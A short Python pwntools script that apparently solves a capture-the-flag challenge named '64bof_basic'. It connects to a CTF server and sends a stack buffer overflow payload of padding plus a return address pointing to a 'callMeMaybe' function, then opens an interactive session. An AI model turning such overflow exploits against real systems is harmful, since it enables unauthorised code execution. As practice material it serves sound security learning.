#!/usr/bin/python 
from pwn import *

#p = process("./64bof_basic")
p = remote("ctf.j0n9hyun.xyz", 3004)
callMeMaybe = 0x400606

pay = 'A'*0x118 + p64(callMeMaybe)
p.sendline(pay)

p.interactive()
